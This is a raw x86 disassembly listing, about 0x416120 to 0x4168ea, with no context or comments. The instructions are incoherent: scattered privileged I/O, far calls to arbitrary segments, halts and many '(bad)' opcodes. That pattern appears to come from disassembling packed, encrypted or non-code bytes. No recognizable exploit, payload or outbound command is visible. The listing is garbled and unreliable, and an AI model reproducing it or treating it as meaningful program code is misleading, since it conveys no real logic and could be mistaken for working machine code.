  416120:	dec    ebp
  416121:	inc    edi
  416122:	sar    DWORD PTR [ebx-0x116c27c8],cl
  416128:	test   al,0xf3
  41612a:	pusha  
  41612b:	call   0x1ef0c204
  416130:	mov    bh,0xdf
  416132:	mov    al,ds:0x3ca18476
  416137:	cmc    
  416138:	les    ecx,FWORD PTR [eax-0x80]
  41613b:	and    eax,0x40d393bf
  416140:	ins    BYTE PTR es:[edi],dx
  416141:	jno    0x416118
  416143:	push   esi
  416144:	sub    ecx,esi
  416146:	push   es
  416147:	inc    ebx
  416148:	or     al,0xf6
  41614a:	nop
  41614b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41614c:	paddusw mm2,QWORD PTR ds:[ebp+esi*8-0x4db79dc1]
  416155:	rol    BYTE PTR [edi+0x39],1
  416158:	aad    0xcb
  41615a:	mov    bh,0xd0
  41615c:	call   edi
  41615e:	retf   0xe41d
  416161:	sbb    dl,BYTE PTR [ecx+ebp*2+0x2]
  416165:	jns    0x4161c8
  416167:	mov    ecx,0xd1064c0d
  41616c:	and    cl,BYTE PTR [edx-0x1e]
  41616f:	add    eax,DWORD PTR ds:0xe0e6d4ca
  416175:	out    dx,eax
  416176:	in     al,0x14
  416178:	imul   esp
  41617a:	cmp    edi,ebp
  41617c:	bnd jge 0x4161da
  41617f:	dec    esp
  416180:	dec    ecx
  416181:	mov    ebp,DWORD PTR [esi]
  416183:	or     ebx,esp
  416185:	push   ds
  416186:	and    eax,0xb6012959
  41618b:	in     eax,dx
  41618c:	cli    
  41618d:	ds aad 0xb8
  416190:	sbb    bh,al
  416192:	mov    bh,cl
  416194:	push   cs
  416195:	sbb    esi,0x123aba26
  41619b:	and    eax,0x9a00817a
  4161a0:	out    0x72,al
  4161a2:	and    BYTE PTR [ecx+0x4e],0x26
  4161a6:	data16 lods al,BYTE PTR ds:[esi]
  4161a8:	fldcw  WORD PTR [ecx+0x3c]
  4161ab:	imul   edi,eax,0x915cb38
  4161b1:	in     al,0xbb
  4161b3:	and    eax,0x85cb4daa
  4161b8:	sbb    ch,BYTE PTR [esi-0x33]
  4161bb:	pop    ebx
  4161bc:	fdiv   DWORD PTR [edx]
  4161be:	js     0x4161e7
  4161c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4161c1:	push   ebx
  4161c2:	stos   DWORD PTR es:[edi],eax
  4161c3:	sbb    DWORD PTR [edx+0x7130e711],ebp
  4161c9:	shl    al,0x1e
  4161cc:	daa    
  4161cd:	inc    edx
  4161ce:	dec    edi
  4161cf:	adc    al,0xb1
  4161d1:	dec    eax
  4161d2:	adc    eax,0xdc32811c
  4161d7:	mov    bh,0x87
  4161d9:	fisub  DWORD PTR [ecx]
  4161db:	rep lods eax,DWORD PTR ds:[esi]
  4161dd:	push   eax
  4161de:	inc    esp
  4161df:	lods   eax,DWORD PTR ds:[esi]
  4161e0:	fiadd  DWORD PTR ds:0x3a387ae0
  4161e6:	dec    edi
  4161e7:	pop    ss
  4161e8:	xor    ebp,DWORD PTR [esi*1-0x3bc94251]
  4161ef:	adc    dl,BYTE PTR [eax]
  4161f1:	call   0xec42:0xce781681
  4161f8:	push   cs
  4161f9:	in     al,dx
  4161fa:	das    
  4161fb:	idiv   DWORD PTR [esi]
  4161fd:	cmp    bh,BYTE PTR [edx]
  4161ff:	mov    al,0xeb
  416201:	jmp    0x388216c6
  416206:	add    BYTE PTR [ecx-0x4445b9e],ch
  41620c:	loope  0x4161be
  41620e:	xor    eax,ebp
  416210:	mov    eax,0xaaab32c3
  416215:	cmp    BYTE PTR [ecx],bl
  416217:	mov    esi,0x687afe26
  41621c:	icebp  
  41621d:	add    BYTE PTR [ecx+0x3e],dl
  416220:	fisttp WORD PTR ds:0x7ebb538d
  416226:	push   ebx
  416227:	inc    eax
  416228:	hlt    
  416229:	popa   
  41622a:	lds    eax,FWORD PTR [ebx-0x3376f3a]
  416230:	push   ss
  416231:	test   BYTE PTR [ebx+0x63],dh
  416234:	cmc    
  416235:	inc    ebx
  416236:	cmp    eax,0xc78f9c3b
  41623b:	xchg   esi,eax
  41623c:	jle    0x416215
  41623e:	dec    ebp
  41623f:	dec    ebp
  416240:	fabs   
  416242:	(bad)  
  416243:	out    dx,al
  416244:	cmp    eax,DWORD PTR [ebx-0x31cc97b3]
  41624a:	jbe    0x416212
  41624c:	leave  
  41624d:	(bad)  
  41624e:	clc    
  41624f:	into   
  416250:	dec    eax
  416251:	(bad)  
  416252:	sbb    BYTE PTR [ebp+0x6b297008],al
  416258:	retf   0x79d4
  41625b:	fidivr DWORD PTR [esi]
  41625d:	pop    edi
  41625e:	or     DWORD PTR [ebx-0x6489cb22],0x4a58ce64
  416268:	push   cs
  416269:	xlat   BYTE PTR ds:[ebx]
  41626a:	mov    ecx,0x414217de
  41626f:	adc    al,BYTE PTR [ecx+0x31]
  416272:	push   edx
  416273:	mov    esi,0x13037cb7
  416278:	hlt    
  416279:	dec    ecx
  41627a:	je     0x41629a
  41627c:	cmp    DWORD PTR [edi+0x79459bb0],0x3e
  416283:	mov    bl,0xb4
  416285:	icebp  
  416286:	(bad)  
  416287:	push   edi
  416288:	sar    eax,cl
  41628a:	pusha  
  41628b:	test   DWORD PTR [ebx+0x0],ebp
  41628e:	daa    
  41628f:	lock fwait
  416291:	adc    ch,0x44
  416294:	jno    0x416261
  416296:	jns    0x4162fa
  416298:	in     eax,0x1
  41629a:	jne    0x416233
  41629c:	jmp    DWORD PTR [edi+0x44]
  41629f:	scas   al,BYTE PTR es:[edi]
  4162a0:	sar    DWORD PTR [ecx-0x36],0xf6
  4162a4:	add    ecx,DWORD PTR [edi+0x41bd76c8]
  4162aa:	mov    ds:0xfb31fdb8,eax
  4162af:	scas   al,BYTE PTR es:[edi]
  4162b0:	mov    edx,0xda05d29e
  4162b5:	es repnz in eax,0xbc
  4162b9:	jnp    0x4162da
  4162bb:	sbb    DWORD PTR [ecx+edx*2+0x25deed15],edi
  4162c2:	jnp    0x4162fe
  4162c4:	push   es
  4162c5:	inc    ebp
  4162c6:	div    BYTE PTR [edi-0x781491a7]
  4162cc:	ret    
  4162cd:	outs   dx,DWORD PTR ds:[esi]
  4162ce:	(bad)  
  4162cf:	out    0xd8,eax
  4162d1:	xchg   edx,eax
  4162d2:	in     al,dx
  4162d3:	arpl   WORD PTR [esi],bx
  4162d5:	jb     0x41627d
  4162d7:	pop    ss
  4162d8:	jmp    0x4162b0
  4162da:	pop    edi
  4162db:	cwde   
  4162dc:	in     al,0x2f
  4162de:	push   0xc25b4055
  4162e3:	mov    bl,0xb
  4162e5:	jb     0x41630c
  4162e7:	aaa    
  4162e8:	sbb    ch,BYTE PTR [ecx-0x7752e520]
  4162ee:	add    BYTE PTR [edx+esi*1-0xe],0x7f
  4162f3:	mov    al,0x80
  4162f5:	mov    WORD PTR [ecx-0x45fee099],cs
  4162fb:	js     0x416356
  4162fd:	jne    0x41630e
  4162ff:	sbb    eax,0x14bb1922
  416304:	pop    ecx
  416305:	in     al,0xb1
  416307:	push   ebp
  416308:	fwait
  416309:	mov    bl,0x9c
  41630b:	and    al,0x3c
  41630d:	mov    eax,ds:0x26cfe958
  416312:	or     al,0x67
  416314:	mov    dh,0x5a
  416316:	arpl   WORD PTR [ebx+0x55],dx
  416319:	cmp    dl,BYTE PTR gs:0x981f00c6
  416320:	inc    ecx
  416321:	xchg   ebp,eax
  416322:	iret   
  416323:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416324:	je     0x4162b7
  416326:	xchg   ecx,eax
  416327:	push   cs
  416328:	mov    ds:0xc92a7265,al
  41632d:	jo     0x416348
  41632f:	sbb    bl,ah
  416331:	sbb    DWORD PTR [eax+0x7f22b4c8],0x536c2ce4
  41633b:	daa    
  41633c:	fsubr  QWORD PTR [ebp-0x10]
  41633f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416340:	mov    es,esi
  416342:	or     eax,0x5aeeaf
  416347:	int3   
  416348:	sti    
  416349:	dec    esi
  41634a:	jle    0x41635b
  41634c:	push   cs
  41634d:	cmp    eax,0xbb23a2bf
  416352:	scas   al,BYTE PTR es:[edi]
  416353:	or     al,0xf8
  416355:	push   ds
  416356:	and    BYTE PTR [eax-0x65],ch
  416359:	in     eax,dx
  41635a:	fbld   TBYTE PTR [ecx+0x3a]
  41635d:	leave  
  41635e:	(bad)  
  41635f:	xor    DWORD PTR [ebp+0x2ffa0ff0],ebp
  416365:	inc    esp
  416366:	dec    esp
  416367:	cmp    BYTE PTR [edx],0x3f
  41636a:	fsub   QWORD PTR [edi+0x51c2a76e]
  416370:	int3   
  416371:	call   0xcc2de985
  416376:	aas    
  416377:	pop    ebx
  416378:	sub    BYTE PTR [edi],dh
  41637a:	adc    eax,edx
  41637c:	and    DWORD PTR [ebp-0x58],ebp
  41637f:	loop   0x4163c0
  416381:	and    DWORD PTR [ebx],ecx
  416383:	mov    cl,ah
  416385:	scas   eax,DWORD PTR es:[edi]
  416386:	ror    BYTE PTR [ebx+0x71],0x5d
  41638a:	out    0x52,eax
  41638c:	xchg   DWORD PTR [edx+0xa1adf17],ebx
  416392:	sub    eax,0x5f7d4d6f
  416397:	lds    ebp,FWORD PTR [edi+0x17]
  41639a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41639b:	dec    esi
  41639c:	nop
  41639d:	add    DWORD PTR [ecx-0x58eda507],edi
  4163a3:	pop    ecx
  4163a4:	retfw  
  4163a6:	cmc    
  4163a7:	sbb    ecx,DWORD PTR [eax-0x28]
  4163aa:	out    0xb2,al
  4163ac:	mov    ah,0x8e
  4163ae:	ins    DWORD PTR es:[edi],dx
  4163af:	push   ds
  4163b0:	xor    DWORD PTR [edi],esi
  4163b2:	push   eax
  4163b3:	jmp    0x4163d5
  4163b5:	fdivrp st(6),st
  4163b7:	mov    al,0x78
  4163b9:	pop    esi
  4163ba:	xor    dh,ah
  4163bc:	sub    dh,BYTE PTR [ecx-0x48b2aa1c]
  4163c2:	mov    esi,0xd68ea0e0
  4163c7:	(bad)  
  4163c8:	lods   al,BYTE PTR ds:[esi]
  4163c9:	or     eax,0x619f00ff
  4163ce:	pop    esi
  4163cf:	in     eax,0x29
  4163d1:	lock dec edx
  4163d3:	out    0x69,eax
  4163d5:	int3   
  4163d6:	int3   
  4163d7:	mov    ebp,0x9ae12968
  4163dc:	inc    ecx
  4163dd:	inc    eax
  4163de:	ins    BYTE PTR es:[edi],dx
  4163df:	in     eax,dx
  4163e0:	fild   QWORD PTR [ecx]
  4163e2:	fs push ds
  4163e4:	cmp    DWORD PTR [edx],0xffffffb2
  4163e7:	push   esi
  4163e8:	pusha  
  4163e9:	hlt    
  4163ea:	or     bh,BYTE PTR [esi+ebp*8-0x7f5ddc70]
  4163f1:	inc    eax
  4163f2:	mov    ds:0xeb9781a9,eax
  4163f7:	sub    DWORD PTR [ecx-0x6e],0x54948a2b
  4163fe:	adc    al,0xd1
  416400:	adc    esi,edi
  416402:	push   0x4e
  416404:	pusha  
  416405:	xor    ecx,esi
  416407:	(bad)  
  416408:	ss ret 
  41640a:	xor    DWORD PTR [esi+0x3c],edx
  41640d:	data16 mov bh,0xf4
  416410:	adc    bh,BYTE PTR [edi+eax*1-0x58e49186]
  416417:	loope  0x4163b1
  416419:	add    BYTE PTR [edx+0x1f],bh
  41641c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41641d:	out    0xce,al
  41641f:	and    al,0x4a
  416421:	pop    ds
  416422:	add    DWORD PTR [esi+edi*8-0x3b],0x13
  416427:	das    
  416428:	retf   
  416429:	bound  esi,QWORD PTR [ebp-0x9ec2fad]
  41642f:	jns    0x4164a1
  416431:	dec    ebx
  416432:	add    al,BYTE PTR [edx+0x46]
  416435:	pop    eax
  416436:	push   0xc87c1351
  41643b:	adc    DWORD PTR [ecx-0x66c056d1],0xffffffd7
  416442:	rol    DWORD PTR [bp+di-0x1d],0x63
  416447:	and    eax,0x9eb5b5bf
  41644c:	pop    ss
  41644d:	imul   esp,DWORD PTR [edx-0x74ac53ca],0xdb990ea7
  416457:	hlt    
  416458:	xor    DWORD PTR [edx-0x2b],edx
  41645b:	inc    ebx
  41645c:	dec    esi
  41645d:	ud2    
  41645f:	push   0xd716f87
  416464:	lea    edi,[eax-0x2d166089]
  41646a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41646b:	sbb    al,0x4
  41646d:	mov    al,ds:0xbe017cca
  416472:	inc    ebx
  416473:	lods   al,BYTE PTR ds:[esi]
  416474:	ret    0x4533
  416477:	popa   
  416478:	inc    ebp
  416479:	gs popf 
  41647b:	push   esp
  41647c:	rol    BYTE PTR [ebp+0x7c13ca0],0x71
  416483:	xchg   ebp,eax
  416484:	js     0x4164e8
  416486:	pushf  
  416487:	scas   al,BYTE PTR es:[edi]
  416488:	scas   eax,DWORD PTR es:[edi]
  416489:	aaa    
  41648a:	ins    DWORD PTR es:[edi],dx
  41648b:	sub    DWORD PTR [ebp-0x11],edi
  41648e:	push   0xa087a389
  416493:	pop    ebp
  416494:	out    dx,eax
  416495:	stc    
  416496:	and    DWORD PTR [ecx],ebx
  416498:	xor    ah,BYTE PTR [edx-0x7a]
  41649b:	push   0x4416f831
  4164a0:	pushf  
  4164a1:	mov    ah,0x45
  4164a3:	ja     0x416454
  4164a5:	lock fistp WORD PTR [edx+0x16b98340]
  4164ac:	sbb    al,0xac
  4164ae:	outs   dx,BYTE PTR ds:[esi]
  4164af:	push   ecx
  4164b0:	dec    ebp
  4164b1:	lods   al,BYTE PTR ds:[esi]
  4164b2:	pusha  
  4164b3:	push   edx
  4164b4:	adc    eax,0x62d6c325
  4164b9:	push   esi
  4164ba:	mov    WORD PTR [ebp+0x5979662e],gs
  4164c0:	lea    esp,ds:0x1b0344d9
  4164c6:	mov    cl,0xcf
  4164c8:	and    BYTE PTR [ebp-0x73],dh
  4164cb:	jmp    0xaabf82d8
  4164d0:	sub    bh,BYTE PTR [ebp-0x76]
  4164d3:	pop    ds
  4164d4:	adc    BYTE PTR [esi-0x2b],ah
  4164d7:	scas   eax,DWORD PTR es:[edi]
  4164d8:	outs   dx,DWORD PTR ds:[esi]
  4164d9:	xchg   esp,eax
  4164da:	je     0x41646d
  4164dc:	and    eax,0xaaf34c6c
  4164e1:	pop    edx
  4164e2:	outs   dx,DWORD PTR ds:[esi]
  4164e3:	adc    BYTE PTR [ecx],dh
  4164e5:	add    DWORD PTR [ecx-0x178ceedd],ebp
  4164eb:	and    cl,ah
  4164ed:	jns    0x4164aa
  4164ef:	addr16 or ah,cl
  4164f2:	jmp    0xe721cd14
  4164f7:	add    DWORD PTR [ebp+edi*8+0x4a773e44],0xa0a92357
  416502:	add    bh,bl
  416504:	(bad)  
  416505:	add    ch,BYTE PTR [edi]
  416507:	mov    eax,ds:0x67aaa185
  41650c:	unpckhps xmm0,XMMWORD PTR [ebx]
  41650f:	shr    bh,cl
  416511:	je     0x41649f
  416513:	inc    esi
  416514:	jo     0x4164bf
  416516:	xor    esi,DWORD PTR [ebx-0x5f72af8d]
  41651c:	icebp  
  41651d:	pop    ecx
  41651e:	or     eax,0x3db39ecc
  416523:	inc    ebx
  416524:	sub    al,BYTE PTR [esi+0x2aab8817]
  41652a:	aad    0x81
  41652c:	jmp    0xc7fd2267
  416531:	scas   eax,DWORD PTR es:[edi]
  416532:	es ja  0x416586
  416535:	dec    esp
  416536:	shl    esp,cl
  416538:	dec    ecx
  416539:	jle    0x4164bb
  41653b:	dec    esp
  41653c:	dec    ecx
  41653d:	shl    DWORD PTR [edx-0x72],0xf5
  416541:	xchg   esp,eax
  416542:	or     al,0x1
  416544:	adc    DWORD PTR [ebp+0x3d],0x7f
  416548:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416549:	mov    ebp,0x7c8050e3
  41654e:	xor    edi,ecx
  416550:	xor    DWORD PTR ds:0x572545d,0x2193d303
  41655a:	pop    esp
  41655b:	cdq    
  41655c:	xchg   ebx,eax
  41655d:	add    BYTE PTR [eax],al
  41655f:	add    BYTE PTR [eax],al
  416561:	add    al,bh
  416563:	pminsw mm6,QWORD PTR [edi-0x1]
  416567:	idiv   ebp
  416569:	(bad)  
  41656a:	repz push esi
  41656c:	retf   0x4f1
  41656f:	or     eax,0xe352917d
  416574:	add    BYTE PTR [eax],al
  416576:	repz add al,0x0
  416579:	add    BYTE PTR [ecx+0x35922323],bl
  41657f:	mov    ebx,0x9c5a4b79
  416584:	scas   eax,DWORD PTR es:[edi]
  416585:	jnp    0x416560
  416587:	jae    0x416604
  416589:	dec    ebx
  41658a:	pushf  
  41658b:	or     al,0x24
  41658d:	inc    eax
  41658e:	push   esi
  41658f:	jle    0x416569
  416591:	aad    0xaf
  416593:	test   DWORD PTR [esp+ecx*2+0xc],eax
  416597:	cmp    al,0x8d
  416599:	popa   
  41659a:	fs jnp 0x4165af
  41659d:	jle    0x4165f1
  41659f:	push   edx
  4165a0:	cmp    esp,DWORD PTR [ecx+0x24]
  4165a3:	xor    eax,0xda69e9f3
  4165a8:	ret    0x58e1
  4165ab:	retf   
  4165ac:	call   0xc365:0xd25d9356
  4165b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4165b4:	pop    ebp
  4165b5:	adc    al,0xcd
  4165b7:	sbb    edi,eax
  4165b9:	pop    edi
  4165ba:	test   al,0x81
  4165bc:	and    ebx,DWORD PTR [edx-0x301ea2ae]
  4165c2:	push   0x79
  4165c4:	test   BYTE PTR [edi+0x2ce56d87],ch
  4165ca:	ins    DWORD PTR es:[edi],dx
  4165cb:	daa    
  4165cc:	cmc    
  4165cd:	sub    eax,0xa6bacc26
  4165d2:	bound  esi,QWORD PTR [ecx-0xdf4e7e9]
  4165d8:	jno    0x4165d8
  4165da:	sub    dh,BYTE PTR [ebx-0x15f65470]
  4165e0:	pop    ebx
  4165e1:	jnp    0x416564
  4165e3:	jmp    0x94c0:0x9e12592e
  4165ea:	cld    
  4165eb:	mov    dl,0x60
  4165ed:	js     0x416589
  4165ef:	or     al,0xc3
  4165f1:	adc    dh,0x58
  4165f4:	repnz in eax,dx
  4165f6:	xchg   esi,eax
  4165f7:	inc    edx
  4165f8:	xchg   edi,eax
  4165f9:	fidivr DWORD PTR [esi]
  4165fb:	(bad)  
  4165fc:	and    bl,BYTE PTR [edi+0xa365b53]
  416602:	out    dx,eax
  416603:	(bad)  [eax+ebp*1-0x5130d03a]
  41660a:	sub    al,0x0
  41660c:	sbb    eax,0xb113a947
  416611:	rol    ch,1
  416613:	in     eax,dx
  416614:	mov    esp,0x42c59ccd
  416619:	pop    es
  41661a:	or     dl,cl
  41661c:	xor    al,BYTE PTR [eax+0x56268f5b]
  416622:	inc    edx
  416623:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416624:	outs   dx,DWORD PTR ds:[esi]
  416625:	sbb    eax,0xedaa3580
  41662a:	or     BYTE PTR [esi],ch
  41662c:	idiv   BYTE PTR [eax+0x3a]
  41662f:	mulps  xmm2,xmm4
  416632:	push   cs
  416633:	scas   al,BYTE PTR es:[edi]
  416634:	xchg   esi,eax
  416635:	mov    bh,0xbc
  416637:	push   ecx
  416638:	out    dx,al
  416639:	ss in  eax,0x76
  41663c:	je     0x4165e2
  41663e:	xlat   BYTE PTR ds:[ebx]
  41663f:	jge    0x41662f
  416641:	mov    bh,0x0
  416643:	cs in  al,dx
  416645:	inc    edx
  416646:	shl    bl,1
  416648:	dec    edx
  416649:	push   ebp
  41664a:	(bad)  
  41664b:	mov    bh,0x4c
  41664d:	or     eax,0xd19f630d
  416652:	add    DWORD PTR [eax-0x7e],0x4f
  416656:	adc    ebp,DWORD PTR [ebp+0x6c]
  416659:	daa    
  41665a:	pop    esi
  41665b:	jmp    0x31ae:0x9ed0fa37
  416662:	sbb    BYTE PTR [ecx-0x6ef70b40],ch
  416668:	gs pop esp
  41666a:	cli    
  41666b:	pusha  
  41666c:	dec    esp
  41666d:	repz mov ah,0xf9
  416670:	fdiv   st,st(0)
  416672:	xchg   ecx,eax
  416673:	sub    eax,0xb586f8a7
  416678:	(bad)  
  416679:	pop    edx
  41667a:	mov    ecx,0x92312774
  41667f:	xlat   BYTE PTR ds:[ebx]
  416680:	hlt    
  416681:	pop    edx
  416682:	pop    esi
  416683:	(bad)  
  416684:	sbb    ebx,DWORD PTR [edi]
  416686:	aad    0xfe
  416688:	test   al,0x5b
  41668a:	scas   al,BYTE PTR es:[edi]
  41668b:	pop    sp
  41668d:	cmp    eax,0x2d6a10ef
  416692:	int3   
  416693:	lea    edi,[eax+0x32]
  416696:	dec    esi
  416697:	icebp  
  416698:	sub    DWORD PTR [ecx+0x16],ecx
  41669b:	cmp    ch,BYTE PTR [ebp+0x3607cbe0]
  4166a1:	mov    bl,cl
  4166a3:	jmp    0x8f18e956
  4166a8:	inc    eax
  4166a9:	rcr    BYTE PTR [ebx],0x78
  4166ac:	mov    ds,ecx
  4166ae:	sub    edi,DWORD PTR [eax]
  4166b0:	lds    edx,FWORD PTR [ebp-0x3e]
  4166b3:	mov    al,0x52
  4166b5:	add    eax,0x42a00eff
  4166ba:	mov    eax,0x878f4874
  4166bf:	cmp    edx,DWORD PTR [edi-0x319955a0]
  4166c5:	cmp    bh,BYTE PTR es:[ebp+0x36903b94]
  4166cc:	xchg   ebp,eax
  4166cd:	scas   al,BYTE PTR es:[edi]
  4166ce:	lahf   
  4166cf:	mov    ds:0x86a245f9,al
  4166d4:	jmp    DWORD PTR [esi+0x1f]
  4166d7:	jle    0x416707
  4166d9:	cmp    eax,ebp
  4166db:	pop    eax
  4166dc:	adc    DWORD PTR [eax+esi*1+0x8],ebx
  4166e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4166e1:	sbb    eax,0x9e3a7676
  4166e6:	jg     0x41668d
  4166e8:	mov    bh,0xe9
  4166ea:	add    dh,bh
  4166ec:	pop    esp
  4166ed:	inc    edx
  4166ee:	bnd jo 0x4166b7
  4166f1:	mov    ebp,0xe2bb50ca
  4166f6:	dec    edx
  4166f7:	shl    BYTE PTR [edx-0x4bbdac87],cl
  4166fd:	inc    esp
  4166fe:	xchg   ebx,eax
  4166ff:	inc    eax
  416700:	and    edi,DWORD PTR [edx]
  416702:	shl    DWORD PTR [edx],1
  416704:	xor    al,0x5c
  416706:	lods   al,BYTE PTR ds:[esi]
  416707:	add    dh,al
  416709:	sub    BYTE PTR [ebx+0x40],bh
  41670c:	lock sub BYTE PTR [eax],ah
  41670f:	jbe    0x4166d4
  416711:	mov    edi,0x53e2d919
  416716:	test   DWORD PTR [ecx],0x56dd9f5e
  41671c:	pop    esi
  41671d:	in     al,0xa
  41671f:	add    DWORD PTR [edx+0x61],esp
  416722:	sbb    dl,BYTE PTR [eax]
  416724:	sahf   
  416725:	cmp    ecx,edi
  416727:	loope  0x41670e
  416729:	pop    esp
  41672a:	aam    0xd3
  41672c:	outs   dx,BYTE PTR ds:[esi]
  41672d:	loope  0x4166d0
  41672f:	stos   DWORD PTR es:[edi],eax
  416730:	xchg   ecx,eax
  416731:	cmp    edi,DWORD PTR [esi]
  416733:	nop
  416734:	push   ebx
  416735:	lahf   
  416736:	int3   
  416737:	mov    ds:0x60d10408,eax
  41673c:	mov    ebp,0xfeb76686
  416741:	sub    al,0x92
  416743:	mov    ch,0x53
  416745:	xchg   esp,eax
  416746:	in     al,dx
  416747:	cmp    al,0x15
  416749:	push   ecx
  41674a:	test   BYTE PTR [ebx],0xb9
  41674d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41674e:	jge    0x41671f
  416750:	and    BYTE PTR [eax],ah
  416752:	imul   esi,DWORD PTR [ebx+0x42361843],0x1ef2c30d
  41675c:	das    
  41675d:	inc    ecx
  41675e:	ficom  DWORD PTR [edx]
  416760:	es jbe 0x4166fc
  416763:	mov    al,0x35
  416765:	mov    ds:0x1af7aba8,eax
  41676a:	iret   
  41676b:	in     al,0x54
  41676d:	lods   eax,DWORD PTR ds:[esi]
  41676e:	jle    0x4166f7
  416770:	pop    edi
  416771:	mov    ah,0xb9
  416773:	mov    eax,ds:0x27f2440f
  416778:	dec    edx
  416779:	mov    eax,ds:0xb920f1d3
  41677e:	pop    ebp
  41677f:	jne    0x416742
  416781:	jnp    0x4167c5
  416783:	aas    
  416784:	sets   BYTE PTR [eax]
  416787:	jmp    0x47f83503
  41678c:	xor    eax,DWORD PTR es:[ebx]
  41678f:	jmp    0xfe1c76e5
  416794:	cld    
  416795:	lods   al,BYTE PTR ds:[esi]
  416796:	mov    edi,0x7e5c222c
  41679b:	js     0x4167bf
  41679d:	mov    DWORD PTR [eax+0xa],esp
  4167a0:	push   ss
  4167a1:	adc    BYTE PTR [ecx+ebx*2],ah
  4167a4:	xor    bh,BYTE PTR [eax]
  4167a6:	scas   eax,DWORD PTR es:[edi]
  4167a7:	xchg   edx,eax
  4167a8:	push   edi
  4167a9:	or     BYTE PTR [esi+0xf],ch
  4167ac:	sbb    al,0x47
  4167ae:	repnz stos DWORD PTR es:[edi],eax
  4167b0:	mov    cl,0x5c
  4167b2:	inc    esi
  4167b3:	sub    al,0x22
  4167b5:	xchg   ebx,eax
  4167b6:	jmp    DWORD PTR [ecx-0x3]
  4167b9:	call   0x49d71a9f
  4167be:	lds    edi,FWORD PTR [ebx+0x1690a639]
  4167c4:	add    DWORD PTR [ebx],ebx
  4167c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4167c7:	or     ah,BYTE PTR [edx-0x238fec81]
  4167cd:	cwde   
  4167ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4167cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4167d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4167d1:	inc    ebx
  4167d2:	ret    0xc249
  4167d5:	dec    ebp
  4167d6:	mov    esi,0xdc78d3cd
  4167db:	sbb    BYTE PTR [ecx],0xc2
  4167de:	fs inc ecx
  4167e0:	neg    DWORD PTR [ebp-0x48]
  4167e3:	and    ch,BYTE PTR [ebp-0x51]
  4167e6:	cmp    bl,BYTE PTR [ecx]
  4167e8:	pop    edi
  4167e9:	fsubr  st,st(1)
  4167eb:	sbb    bh,bh
  4167ed:	or     al,0x7e
  4167ef:	sub    BYTE PTR [edi-0x11],bl
  4167f2:	mov    ds,WORD PTR [edi]
  4167f4:	mov    dl,0x29
  4167f6:	adc    DWORD PTR [esi],0x67
  4167f9:	rcr    edi,cl
  4167fb:	mov    ah,0x7
  4167fd:	retf   
  4167fe:	lahf   
  4167ff:	pop    edx
  416800:	imul   ecx,DWORD PTR [ebx-0x2da7efa1],0xffffffa4
  416807:	cmp    BYTE PTR ds:0x57680663,al
  41680d:	or     eax,0xce47ba25
  416812:	imul   esp,DWORD PTR [edx-0x172eab14],0xaa35d4fe
  41681c:	test   eax,0x70b4baa4
  416821:	clc    
  416822:	xchg   DWORD PTR [esi-0xa1fb6ee],esi
  416828:	jle    0x416851
  41682a:	dec    edx
  41682b:	addr16 xchg esp,eax
  41682d:	jne    0x4167d8
  41682f:	punpckhwd mm2,QWORD PTR [edx+0x2cfe2481]
  416836:	jbe    0x41684d
  416838:	fst    QWORD PTR [ecx]
  41683a:	mov    dl,0x4d
  41683c:	push   ds
  41683d:	sub    cl,bl
  41683f:	pop    esp
  416840:	inc    BYTE PTR [eax]
  416842:	xchg   esi,eax
  416843:	add    al,0x3b
  416845:	mov    ds:0x18531b12,eax
  41684a:	cmp    BYTE PTR [eax+ebx*4],ah
  41684d:	jno    0x416819
  41684f:	adc    eax,0xc560a30a
  416854:	push   edx
  416855:	sbb    eax,0x647867a5
  41685a:	mov    cl,0x51
  41685c:	sbb    DWORD PTR [edi-0x6f],esi
  41685f:	push   esi
  416860:	retf   0x220
  416863:	xchg   esp,eax
  416864:	shl    BYTE PTR ds:0xbbeaf384,cl
  41686a:	addr16 adc eax,0x9650e421
  416870:	and    eax,0x7a81f9b4
  416875:	dec    ebp
  416876:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416877:	add    edx,edx
  416879:	scas   eax,DWORD PTR es:[edi]
  41687a:	push   edi
  41687b:	jb     0x416885
  41687d:	add    DWORD PTR [eax-0x3ff7e24],edi
  416883:	imul   eax,DWORD PTR [edx-0x56d31b3b],0x78a633b7
  41688d:	add    eax,0x2bf0cbfb
  416892:	dec    ebx
  416893:	(bad)  
  416894:	fadd   DWORD PTR [eax-0x14]
  416897:	xchg   edi,edx
  416899:	popa   
  41689a:	sub    DWORD PTR [edi+0x57b3a1d],edx
  4168a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4168a1:	(bad)  
  4168a2:	sub    al,0xf2
  4168a4:	add    bl,BYTE PTR [eax-0x69e0da13]
  4168aa:	out    dx,eax
  4168ab:	mov    bh,0xb4
  4168ad:	rol    BYTE PTR [eax+edx*1+0x7fe456fd],0xae
  4168b5:	pop    edx
  4168b6:	iret   
  4168b7:	sub    dl,BYTE PTR [eax+0x90e1995]
  4168bd:	mov    al,ds:0x3431c538
  4168c2:	fcomp  DWORD PTR [esi+0x1631626f]
  4168c8:	repz cs jb 0x416914
  4168cc:	or     al,0x16
  4168ce:	loop   0x4168be
  4168d0:	arpl   di,bp
  4168d2:	mov    ?,WORD PTR [eax]
  4168d4:	xchg   edi,eax
  4168d5:	out    dx,eax
  4168d6:	inc    esp
  4168d7:	(bad)  
  4168d8:	or     al,0x25
  4168da:	and    BYTE PTR [edx-0x2f6560c7],ah
  4168e0:	cmp    ebp,DWORD PTR [ebx-0x4a]
  4168e3:	sti    
  4168e4:	jmp    0xc48f458
  4168e9:	popf   
  4168ea:	mov    edi,0x55cdfde1
